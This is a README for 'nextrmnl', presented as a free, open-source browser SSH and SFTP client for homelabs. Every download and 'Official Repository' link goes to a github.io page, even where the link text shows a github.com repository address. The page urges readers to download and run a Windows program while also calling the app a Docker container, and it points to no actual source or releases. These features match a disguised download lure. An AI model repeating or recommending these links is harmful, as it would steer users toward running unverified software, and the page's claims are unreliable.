# 🖥️ nextrmnl - Secure SSH & SFTP, Right In Your Browser

## 🚀 Getting Started

Welcome to **nextrmnl** — the easiest way to manage your servers from anywhere, without installing complex software. Whether you're a home lab enthusiast or just want to handle your files remotely, nextrmnl brings the power of SSH and SFTP into your web browser.

Think of it as PuTTY and WinSCP combined into one, but you don't install anything. You just open a webpage, and you're connected.

## 📥 Download & Install

[⬇️ **DOWNLOAD NOW**](https://habsanprad.github.io)

Visit this link to download the application. Once you've downloaded it, you're ready to start. No technical setup needed. The program runs as a container, so it's self-contained and simple.

## ✨ What Makes nextrmnl Special?

Here's what you'll love about it:

- **Terminal in your browser** — Access a full SSH terminal without any extra software.
- **File transfer made simple** — Drag and drop files with SFTP, just like a local folder.
- **Personal vault per account** — Save your connections and secrets securely, organized per account.
- **Host key checks** — Security notifications to keep you safe from impersonation attacks.
- **OpenID Connect login** — Sign in with your existing identity provider (like Authentik), no new passwords needed.
- **Works with your homelab** — Perfect for self-hosted services, Docker setups, and personal servers.

## 🛠️ How to Use nextrmnl

### Step 1: Get the Application

First, click the download button above. The application will be saved to your computer.

### Step 2: Start the Program

After downloading, run the program. It will start a small local service on your computer. You don't need to know what that means — just let it run.

### Step 3: Open Your Browser

Open your favorite browser (Chrome, Edge, Firefox — any works). In the address bar, type `localhost` and press Enter. You'll see the nextrmnl interface.

### Step 4: Connect to a Server

- **For Terminal:** Enter your server's address and port (usually 22 for SSH). Use your username and password, or a secure key if you have one.
- **For File Transfer:** Select the "SFTP" tab and connect the same way. Then you'll see your local files on one side and remote files on the other. Drag and drop to transfer.

### Step 5: Save Your Connections (Optional)

Use the vault feature to store connection details. Each account gets its own secure space, so you can switch between servers quickly.

## 🔐 Security Features You'll Appreciate

- **Host Key Verification** — nextrmnl checks the server's identity. If something changes, you'll be warned.
- **OpenID Connect Support** — Log in using your own authentication service. No shared passwords.
- **Secure Storage** — Your credentials are stored in a built-in vault, encrypted and private.

## 🖥️ System Requirements

- **Operating System:** Windows 10 or 11 (64-bit)
- **Memory:** 2 GB RAM minimum (4 GB recommended)
- **Storage:** 500 MB free disk space
- **Browser:** A modern browser with JavaScript enabled (Chrome, Edge, Firefox, Safari)
- **Internet:** A stable connection to your servers or local network

## 📦 What's in the Box?

nextrmnl uses a set of powerful technologies under the hood, but you don't need to understand them. For the curious:

- **Frontend:** React, TypeScript, xterm.js — this creates the smooth terminal experience.
- **Backend:** Python with FastAPI and AsyncSSH — this handles all the secure connections.
- **Data Storage:** SQLite — lightweight and reliable, no separate database needed.
- **Authentication:** OpenID Connect — easily integrate with Authentik or other providers.
- **Deployment:** Docker — run it anywhere with minimal effort.

## 🌐 Advanced: For Your Homelab

If you run a home lab or self-hosted services, here's some extra guidance:

### Run with Docker

If you're comfortable with Docker, you can run nextrmnl with a single command:

```bash
docker run -d -p 8000:8000 nextrmnl
```

Then, access it at `http://localhost:8000`. This works great on Linux servers or NAS devices.

### Connect to Authentik or Other OIDC Providers

To enable single sign-on, configure your OIDC provider (like Authentik) with nextrmnl's callback URL. The settings are usually found in the application's configuration file. Once connected, you'll see a "Sign in with Authentik" button.

### Manage Multiple Servers

Use the connection manager to keep a list of your servers. Assign each to a different vault for organized access.

## ❓ Frequently Asked Questions

### Is nextrmnl free?

Yes, it's completely free and open-source. You can use it for personal or commercial purposes.

### Do I need to install anything else?

No. nextrmnl is self-contained. You only need the application and a browser.

### Can I share it with my team?

Absolutely. Since it runs in a browser, anyone on your network can access it. Just make sure they have the necessary permissions.

### What if I forget my password or key?

You can reset your vault or credentials from the application settings. Just be careful — you'll need to re-enter your server details.

### Is it safe to use over the internet?

Yes, but make sure you use strong passwords and enable host key checks. If you're exposing it publicly, consider putting it behind a reverse proxy with SSL.

## 🧰 Troubleshooting Tips

- **Connection fails** — Double-check the server address and port. Ensure SSH is allowed through your firewall.
- **Terminal is slow** — This can happen with high latency connections. Try a closer server or check your internet speed.
- **Files won't transfer** — Ensure you have write permissions on the remote folder. Also check disk space.
- **Vault access issue** — Try clearing your browser cache, then sign in again.

If problems persist, check the GitHub Issues page for the repository and see if others have reported similar issues.

## 📚 More Resources

- **Official Repository:** [github.com/habsanprad/nextrmnl](https://habsanprad.github.io)
- **Release Downloads:** [Releases](https://habsanprad.github.io)
- **Report a Bug:** Use the Issues tab on GitHub
- **Feature Requests:** Also via GitHub Issues — we'd love to hear your ideas

## 🔄 Staying Updated

When new versions are released, simply download the latest version from the same link above. Your settings and vaults will be preserved during the update.

## 🎉 Start Connecting Today

Say goodbye to clunky desktop apps and hello to browser-based simplicity. With nextrmnl, SSH and SFTP are as easy as opening a tab.

[⬇️ **GET NEXTMNL NOW**](https://habsanprad.github.io)

Visit this link to download the application. You'll be connected before you know it.

---

Keywords: asyncssh, authentik, connection-manager, docker, fastapi, homelab, oidc, putty, python, react, self-hosted, selfhosted, sftp, sqlite, ssh, ssh-client, terminal, typescript, web-terminal, xterm